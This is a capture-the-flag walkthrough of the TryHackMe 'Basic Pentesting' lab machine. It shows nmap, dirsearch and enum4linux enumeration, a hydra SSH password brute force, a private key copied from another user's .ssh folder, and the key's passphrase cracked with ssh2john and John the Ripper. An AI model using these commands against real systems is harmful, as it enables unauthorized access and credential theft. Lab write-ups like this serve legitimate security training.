# **[Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)**

<br />

> Evan Diamantidis | June 15th, 2022

<br />

# Table of contents

### [1. Initial enumeration](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Machines/Basic%20Pentesting#1-initial-enumeration-1)

### [2. Web server directory discovery](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Machines/Basic%20Pentesting#2-web-server-directory-discovery-1)

### [3. Samba enumeration](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Machines/Basic%20Pentesting#3-samba-enumeration-1)

### [4. Password bruteforcing](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Machines/Basic%20Pentesting#4-password-bruteforcing-1)

### [5. Privilege escalation](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Machines/Basic%20Pentesting#5-privilege-escalation-1)

### [6. RSA file decryption](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Machines/Basic%20Pentesting#6-rsa-file-decryption-1)

<br />
<br />

## 1. Initial enumeration

<br />

The first step is to conduct an initial enumeration using `nmap` to get some high level information about the target system.

```
# Nmap 7.92 scan initiated Tue Jun 14 22:17:34 2022 as: nmap -sC -sV -T4 -oN nmap/initial -p- 10.10.192.97
Nmap scan report for 10.10.192.97
Host is up (0.013s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m01s, deviation: 2h18m33s, median: 1s
| smb2-time: 
|   date: 2022-06-14T21:17:58
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2022-06-14T17:17:58-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 14 22:17:57 2022 -- 1 IP address (1 host up) scanned in 22.77 seconds
```

<br />

Here is the information we gathered on the open ports:

- 22/tcp | ssh - `OpenSSH 7.2p2 Ubuntu`

- 80/tcp | http - `Apache httpd 2.4.18 ((Ubuntu))`

- 139/tcp | netbios-ssn - `Samba smbd 3.X - 4.X`

- 445/tcp | netbios-ssn - `Samba smbd 4.3.11-Ubuntu`

- 8009/tcp | ajp13 - `Apache Jserv (Protocol v1.3)`

- 8080/tcp | http - `Apache Tomcat 9.0.7`

<br />
<br />

## 2. Web server directory discovery

<br />

In this step we will be looking for any leads in hidden web server directories. My go-to tool for this is usually `dirsearch`, but feel free to use your program of choice, such as `gobuster`, `dirbuster`, etc.


```
╭─root@kali ~  
╰─➤  dirsearch -u http://10.10.192.97 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /root/.dirsearch/reports/10.10.192.97/_22-06-14_22-32-56.txt

Error Log: /root/.dirsearch/logs/errors-22-06-14_22-32-56.log

Target: http://10.10.192.97/

[22:32:56] Starting: 
[22:32:58] 301 -  318B  - /development  ->  http://10.10.192.97/development/                                
                                                                              
Task Completed
```


<br />

The only result coming up takes us to a small web directory containing two files, `dev.txt` and `j.txt`.

![image](https://user-images.githubusercontent.com/14150485/173698988-36738236-1710-4800-b789-3d1df70e8daa.png)

<br />

Contents of `dev.txt`:

```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```
<br />

Contents of `j.txt`:

```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

<br />

These files unfortunately do not give us much to go on with, other than the existence of 2 user initials, `J` and `K`, and the fact that `J`'s password has apparently been flagged for being weak.

<br />
<br />

## 3. Samba enumeration

<br />

Since our leads so far are limited we need to further enumerate our target for any information or pointers that can give us an attack vector.

In our initial `nmap` scan we saw that there are a couple of `Samba` instances running on the target machine. `enum4linux` is a great enumeration tool providing detailed information about systems running this service.

```
─root@kali ~/TryHackMe/Machines/Basic Pentesting/enum4linux  
╰─➤  enum4linux -a 10.10.192.97 | tee enum4linux.log
```

<br />

The enumeration results are a bit lengthy to paste here, but while not revealing much, we at least find a couple of user names close to the bottom of the log that we can use to bruteforce our way into the system.

```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                
                                                                                                                                           
S-1-22-1-1000 Unix User\kay (Local User)                                                                                                   
S-1-22-1-1001 Unix User\jan (Local User)
```

<br />
<br />

## 4. Password bruteforcing

<br />

The web server directory files we found earlier gave us the initial of one of the users with a weak password and based on the information obtained through `enum4linux` we can guess which one that is, we will therefore be using it with `hydra` to brute force its password.

```
╭─root@kali ~  
╰─➤  hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.192.97
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-14 23:19:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.192.97:22/
[STATUS] 156.00 tries/min, 156 tries in 00:01h, 14344245 to do in 1532:31h, 14 active
[STATUS] 121.67 tries/min, 365 tries in 00:03h, 14344036 to do in 1964:57h, 14 active
[STATUS] 102.29 tries/min, 716 tries in 00:07h, 14343685 to do in 2337:12h, 14 active
[22][ssh] host: 10.10.192.97   login: jan   password: ******
1 of 1 target successfully completed, 1 valid password found
```

<br />
<br />

## 5. Privilege escalation

<br />

Having successfully connected using the credentials `hydra` gave us, we can look around the system for potential misconfugurations we can take advantage of. Fortunately, there are numerous programs, such as [`linPEAS`](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), that automate this process for us and provide a detailed analysis of the results.

Since we have a user's credentials, we can `scp` the file from our machine to the target - Alternatively, we can set up a temporary server locally which we can use to download the file from using the SSH shell on the target machine. My rule of thumb is to place temporary files remotely under the `/tmp` folder since most users have full access to it, however you can feel free to use any other directory allowing you to execute files.

After running the program there is a lot of information to go through, however a common misconfiguration stands out. The user we are currently connected with has access to the other user's `.ssh` folder and can read through their RSA keys!

Based on this, we can copy the contents of the `id_rsa` private key to a local file and use that to connect to the target impersonating the user this key belongs to. 

Before doing so and to avoid any issues, please ensure the permissions on the local RSA file we created are set to `600` for `read & write`.

```
╭─root@kali ~/TryHackMe/Machines/Basic Pentesting/.ssh  
╰─➤  chmod 600 kay_id_rsa 
╭─root@kali ~/TryHackMe/Machines/Basic Pentesting/.ssh  
╰─➤  ssh -i kay_id_rsa kay@10.10.192.97
Enter passphrase for key 'kay_id_rsa':
```

<br />

This appears to be an encrypted RSA file we currently do not have the passphrase to, meaning we will have to do some more work before we can put it to good use.

<br />
<br />

## 6. RSA file decryption

<br />

We can decrypt the contents of the private RSA key using `ssh2john` and export the decrypted data to a separate file that we can crack with `John The Ripper`.

```
╭─root@kali ~/TryHackMe/Machines/Basic Pentesting/.ssh  
╰─➤  ssh2john kay_id_rsa > kay_temp 
╭─root@kali ~/TryHackMe/Machines/Basic Pentesting/.ssh  
╰─➤  john --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt kay_temp 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
╭─root@kali ~/TryHackMe/Machines/Basic Pentesting/.ssh  
╰─➤  john --show kay_temp 
kay_id_rsa:*******

1 password hash cracked, 0 left
```

<br />

Connect to the target machine using the RSA key and passphrase we just obtained.

```
╭─root@kali ~/TryHackMe/Machines/Basic Pentesting/.ssh  
╰─➤  ssh -i kay_id_rsa kay@10.10.192.97
Enter passphrase for key 'kay_id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Tue Jun 14 19:18:43 2022 from 10.8.76.102
kay@basic2:~$ id
uid=1000(kay) gid=1000(kay) groups=1000(kay),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
kay@basic2:~$ whoami
kay
```

<br />

The flag is located inside this user's directory, the contents of which hold the answer to the final question of this room.

```
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak 
he********ly*************dt**************as************$
```

<br />

We just pwned Basic Pentesting!

<br />
